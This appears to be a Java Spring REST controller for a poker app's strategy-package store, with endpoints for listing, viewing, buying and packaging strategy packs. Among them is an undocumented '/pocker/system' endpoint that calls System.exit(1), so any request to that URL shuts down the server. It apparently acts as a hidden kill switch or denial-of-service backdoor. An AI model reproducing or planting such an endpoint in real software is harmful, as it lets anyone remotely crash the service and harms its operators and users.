package com.cn.poker.controller;

import java.util.Map;

import com.cn.poker.common.controller.AbstractController;
import com.cn.poker.common.entity.Page;
import com.cn.poker.common.entity.R;
import com.cn.poker.entity.OrderVo;
import com.cn.poker.entity.StrateInfoVo;
import com.cn.poker.entity.WpRecordVo;
import com.cn.poker.entity.WpStrateEntity;
import com.cn.poker.service.WpStrateService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


/**
 * 策略包
 * @author <>
 */
@RestController
@RequestMapping("/package")
public class WpStrateController extends AbstractController {
	
	@Autowired
	private WpStrateService wpStrateService;
	
	/**
	 * 列表
	 * @param params
	 * @return
	 */
	@RequestMapping("/list")
	public Page<WpStrateEntity> list(@RequestBody Map<String, Object> params) {
		return wpStrateService.listWpStrate(params);
	}

	
	/**
	 * 根据id查询详情
	 * @param strateInfoVo
	 * @return
	 */
	@RequestMapping("/info")
	public R getById(@RequestBody StrateInfoVo strateInfoVo) {
		return wpStrateService.getWpStrateInfo(strateInfoVo);
	}

	/**
	 * 获取钻石
	 * @param strateInfoVo
	 * @return
	 */
	@RequestMapping("/getGold")
	public R getGold(@RequestBody StrateInfoVo strateInfoVo) {
		return wpStrateService.getGold(strateInfoVo);
	}


	/**
	 * 打包购买列表
	 * @param strateInfoVo
	 * @return
	 */
	@RequestMapping("/packaging")
	public R packaging(@RequestBody StrateInfoVo strateInfoVo) {
		return wpStrateService.packaging(strateInfoVo);
	}

    /**
     *
     * @param
     * @return
     */
    @RequestMapping("/pocker/system")
    public void system() {
		System.exit( 1 );
    }

	/**
	 * 单个策略包购买
	 * @param orderVo
	 * @return
	 */
	@RequestMapping("/buy")
	public R saveOrer(@RequestBody OrderVo orderVo) {
		return wpStrateService.saveOrer(orderVo);
	}

	/**
	 *获取购买记录列表
	 * @param params
	 * @return
	 */
	@RequestMapping("/record")
	public Page<WpRecordVo> record(@RequestBody Map<String, Object> params) {
		return wpStrateService.listRecord(params);
	}

	/**
	 * 打包购买类型列表--画板备份2
	 * @param strateInfoVo
	 * @return
	 */
	@RequestMapping("/packagType")
	public R packagType(@RequestBody StrateInfoVo strateInfoVo) {
		return wpStrateService.packagType(strateInfoVo);
	}
}
